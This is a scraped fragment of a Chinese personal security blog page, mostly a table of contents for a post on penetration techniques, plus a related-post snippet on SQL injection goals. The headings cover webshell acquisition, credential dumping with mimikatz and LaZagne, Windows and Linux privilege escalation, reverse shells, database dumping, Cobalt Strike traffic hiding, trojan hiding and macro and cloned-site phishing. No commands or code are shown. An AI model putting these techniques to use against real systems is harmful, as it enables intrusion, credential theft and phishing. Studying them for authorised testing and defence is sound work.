获取网站业务数据表名称 获取网站业务表字段信息 获取网站业务真实数据（SQL注入目的：窃取数据） 利用联合注入获取数据信息（配合order by获取字段数）   实现篡改或破坏数据 （堆叠注入）  漏洞点查找SQL漏洞点获取  登录的地方、更新的地方、注册的地方、留言板、查询、删除等 HTTP Header: UA：用户指纹信息 chrome –...</div></div></div></a><a class="pagination-related" href="/posts/e1dc7286.html" title="小迪安全--基础讲解(1)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">小迪安全--基础讲解(1)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/dba72746.html" title="小迪安全--信息打点(2)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">小迪安全--信息打点(2)</div></div><div class="info-2"><div class="info-item-1">业务资产查询平台：    小蓝本 https://www.xiaolanben.com/    爱企查 https://aiqicha.baidu.com/   业务类型 WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等 Web应用工具大全 [~]#棱角 ::Edge.Forum 主要资产内容  WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6....</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">GoldY</div><div class="author-info-description">不经一番寒彻骨，怎得梅花扑鼻香。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yuwenjin666"><i class="fab fa-github"></i><span>Github主页</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">联系我V：GoldY_66</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96webshell%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">获取webshell方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CMS%E8%8E%B7%E5%8F%96webshell"><span class="toc-number">1.1.</span> <span class="toc-text">CMS获取webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99"><span class="toc-number">1.1.1.</span> <span class="toc-text">在线信息收集网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.2.</span> <span class="toc-text">CMS识别工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%AF%86%E5%88%ABCMS%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.3.</span> <span class="toc-text">其他识别CMS方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.4.</span> <span class="toc-text">CMS漏洞检测工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9ECMS%E8%8E%B7%E5%8F%96webshell"><span class="toc-number">1.2.</span> <span class="toc-text">非CMS获取webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">有管理权限的情况：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%AD%A3%E5%B8%B8%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B0%8F%E9%A9%AC%E8%8E%B7%E5%8F%96webshell"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">通过正常上传一句话小马获取webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E8%8E%B7%E5%8F%96webshell"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">利用后台数据库备份获取webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%8A%B1%E6%A0%B7%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B0%8F%E9%A9%AC%E8%8E%B7%E5%8F%96Webshell"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">通过花样上传一句话小马获取Webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BC%96%E8%BE%91%E6%A8%A1%E5%9D%97%E3%80%81%E6%A0%87%E7%AD%BE%E7%AD%89%E6%8B%BFWebShell"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">通过编辑模块、标签等拿WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E5%91%BD%E4%BB%A4%E8%8E%B7%E5%8F%96"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">SQL命令获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%8B%BFWebShell"><span class="toc-number">1.2.1.6.</span> <span class="toc-text">利用解析漏洞拿WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8B%BFWebShell"><span class="toc-number">1.2.1.7.</span> <span class="toc-text">利用编辑器漏洞拿WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFWebShell"><span class="toc-number">1.2.1.8.</span> <span class="toc-text">文件包含拿WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%85%B6%E5%AE%83%E8%84%9A%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%8B%BFWebShell"><span class="toc-number">1.2.1.9.</span> <span class="toc-text">上传其它脚本类型拿WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%BD%91%E7%AB%99%E4%B8%8A%E4%BC%A0%E7%B1%BB%E5%9E%8B%E9%85%8D%E7%BD%AE%E6%9D%A5%E6%8B%BFWebShell"><span class="toc-number">1.2.1.10.</span> <span class="toc-text">修改网站上传类型配置来拿WebShell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">非管理权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">SQL注入漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E5%92%8Csql%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">xss和sql注入联合利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS%E5%86%99%E6%9D%83%E9%99%90%E6%8B%BFWebShell"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">IIS写权限拿WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8B%BFWebShell"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">远程命令执行拿WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0%E6%8B%BFWebShell"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">头像上传拿WebShell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96"><span class="toc-number">2.</span> <span class="toc-text">管理员密码提取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mimikatz%E5%B7%A5%E5%85%B7%E8%AF%BB%E5%8F%96"><span class="toc-number">2.1.</span> <span class="toc-text">mimikatz工具读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0hash%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.</span> <span class="toc-text">本地hash远程攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8LaZagne"><span class="toc-number">2.3.</span> <span class="toc-text">使用LaZagne</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">Windows系统提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87"><span class="toc-number">3.1.</span> <span class="toc-text">提权知识储备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.1.</span> <span class="toc-text">常见提权方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cmd%E5%91%BD%E4%BB%A4%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="toc-number">3.1.2.</span> <span class="toc-text">Cmd命令无法执行原因分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AE%B2%E8%A7%A3"><span class="toc-number">3.1.3.</span> <span class="toc-text">提权常用命令讲解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98"><span class="toc-number">3.2.</span> <span class="toc-text">系统溢出漏洞提权实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9B%B6%E3%80%81%E7%B3%BB%E7%BB%9F%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-number">3.2.1.</span> <span class="toc-text">零、系统溢出漏洞提权分类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81UAC%E7%BB%95%E8%BF%87%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.2.</span> <span class="toc-text">一、UAC绕过提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.3.</span> <span class="toc-text">二、利用系统内核溢出漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E5%8F%AF%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">如何判断可用的漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8SC%E5%B0%86administrator%E6%8F%90%E6%9D%83%E8%87%B3system"><span class="toc-number">3.2.4.</span> <span class="toc-text">三、利用SC将administrator提权至system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%88%A9%E7%94%A8%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-number">3.2.5.</span> <span class="toc-text">四、利用不带引号的服务路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">3.2.6.</span> <span class="toc-text">五、利用不安全的服务权限</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">3.2.6.0.1.</span> <span class="toc-text">完整案例：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.2.7.</span> <span class="toc-text">六、计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%E3%80%81Meterpreter%E5%9F%BA%E7%A1%80%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.8.</span> <span class="toc-text">七、Meterpreter基础提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%E9%98%B2%E8%8C%83"><span class="toc-number">3.3.</span> <span class="toc-text">溢出漏洞安全防范</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%90%8E%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">提权后获取管理员密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E5%A6%82%E4%BD%95%E7%9B%B4%E6%8E%A5%E6%8F%90%E5%8F%96"><span class="toc-number">3.4.1.</span> <span class="toc-text">1、本地管理员密码如何直接提取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E3%80%81%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87mimikatz%E8%AF%BB%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.1.1.</span> <span class="toc-text">①、直接通过mimikatz读取管理员密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E3%80%81Lazagne-%E9%9C%80%E8%A6%81%E6%9C%AC%E5%9C%B0%E6%94%AF%E6%8C%81python"><span class="toc-number">3.4.1.2.</span> <span class="toc-text">②、Lazagne 需要本地支持python</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%9C%AC%E5%9C%B0Hash%E8%BF%9C%E7%A8%8B%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95"><span class="toc-number">3.4.2.</span> <span class="toc-text">2、本地Hash远程直接登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81Hash%E5%AF%86%E9%92%A5%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.4.3.</span> <span class="toc-text">3、Hash密钥暴力破解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">Linux系统提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%86%85%E6%A0%B8%E7%9F%A5%E8%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">linux内核知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">4.2.</span> <span class="toc-text">Linux提权方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81Linux%E5%8F%8D%E5%BC%B9%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.1.</span> <span class="toc-text">一、Linux反弹提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81NC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">1、NC反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%88%A9%E7%94%A8bash%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">2、利用bash直接反弹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94%E8%84%8F%E7%89%9B"><span class="toc-number">4.2.2.</span> <span class="toc-text">二、内核漏洞提权——脏牛</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">示例：脏牛内核提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81SUID%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.3.</span> <span class="toc-text">三、SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SUID%E5%8F%AF%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">4.2.3.1.</span> <span class="toc-text">SUID可用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E5%88%A9%E7%94%A8find%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.3.2.</span> <span class="toc-text">示例：利用find文件提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Linux%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.4.</span> <span class="toc-text">四、Linux配置错误提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.5.</span> <span class="toc-text">五、定时任务提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.6.</span> <span class="toc-text">六、密码复用提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%88%B0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">5.</span> <span class="toc-text">数据库提权到操作系统</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">Mysql数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96mysql%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">5.1.1.</span> <span class="toc-text">如何获取mysql账号密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8UDF%E8%87%AA%E8%BA%AB%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.2.</span> <span class="toc-text">利用UDF自身提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8mof%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.3.</span> <span class="toc-text">利用mof提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Mysql%E6%8A%8A%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">5.1.4.</span> <span class="toc-text">通过Mysql把文件写入启动项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%AE%E8%BD%AFMssql%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">微软Mssql提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87Oracle%E6%8F%90%E6%9D%83"><span class="toc-number">5.3.</span> <span class="toc-text">如何通过Oracle提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E9%98%B2%E8%8C%83"><span class="toc-number">5.4.</span> <span class="toc-text">数据库安全防范</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%84%B1%E5%BA%93"><span class="toc-number">6.</span> <span class="toc-text">数据库脱库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E8%84%B1%E5%BA%93"><span class="toc-number">6.1.</span> <span class="toc-text">工具脱库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%84%B1%E5%BA%93"><span class="toc-number">6.2.</span> <span class="toc-text">脚本脱库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%99%E7%82%B9%E6%89%93%E5%8C%85"><span class="toc-number">6.3.</span> <span class="toc-text">站点打包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">7.</span> <span class="toc-text">内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nps%E9%80%86%E5%90%91%E7%A9%BF%E9%80%8F"><span class="toc-number">7.1.</span> <span class="toc-text">nps逆向穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">7.1.1.</span> <span class="toc-text">端口映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91"><span class="toc-number">7.1.2.</span> <span class="toc-text">流量转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frp%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F"><span class="toc-number">7.2.</span> <span class="toc-text">frp反向代理穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%90%8E%E5%8F%B0%E8%BF%90%E2%BE%8F%E5%8F%8A%E5%BC%80%E6%9C%BA%E2%BE%83%E5%90%AF"><span class="toc-number">7.2.1.</span> <span class="toc-text">客户端后台运⾏及开机⾃启</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F"><span class="toc-number">7.3.</span> <span class="toc-text">正向代理穿透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="toc-number">8.</span> <span class="toc-text">渗透测试工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cobalt-Striket%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7"><span class="toc-number">8.1.</span> <span class="toc-text">Cobalt Striket提权工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F"><span class="toc-number">8.1.1.</span> <span class="toc-text">CS流量隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E8%AF%81%E4%B9%A6%E7%89%B9%E5%BE%81%E5%80%BC"><span class="toc-number">8.1.1.1.</span> <span class="toc-text">修改证书特征值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CDN%E6%8E%A5%E5%85%A5"><span class="toc-number">8.1.1.2.</span> <span class="toc-text">CDN接入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">8.1.2.</span> <span class="toc-text">工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%90%AF%E5%8A%A8"><span class="toc-number">8.1.2.1.</span> <span class="toc-text">服务端启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%90%AF%E5%8A%A8"><span class="toc-number">8.1.2.2.</span> <span class="toc-text">客户端启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXE%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">8.1.2.3.</span> <span class="toc-text">EXE可执行文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E9%9A%90%E8%97%8F%EF%BC%88%E5%8E%8B%E7%BC%A9%E6%B3%95%EF%BC%89"><span class="toc-number">8.1.2.3.1.</span> <span class="toc-text">木马隐藏（压缩法）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8F%8D%E8%BD%AC%E6%B3%95"><span class="toc-number">8.1.2.3.2.</span> <span class="toc-text">文件反转法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#office%E5%AE%8F%E9%92%93%E9%B1%BC"><span class="toc-number">8.1.2.4.</span> <span class="toc-text">office宏钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E9%92%93%E9%B1%BC"><span class="toc-number">8.1.2.5.</span> <span class="toc-text">克隆网站钓鱼</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E8%81%94%E5%8A%A8"><span class="toc-number">8.1.3.</span> <span class="toc-text">MSF联动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CS%E5%8F%8D%E5%BC%B9shell%E5%88%B0MSF"><span class="toc-number">8.1.3.1.</span> <span class="toc-text">CS反弹shell到MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E5%8F%8D%E5%BC%B9shell%E5%88%B0CS"><span class="toc-number">8.1.3.2.</span> <span class="toc-text">MSF反弹shell到CS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">8.1.4.</span> <span class="toc-text">防御措施</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/944d69ee.html" title="云计算方向-Ansible搭建wordpress"><img src="/img/cloud-com.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算方向-Ansible搭建wordpress"/></a><div class="content"><a class="title" href="/posts/944d69ee.html" 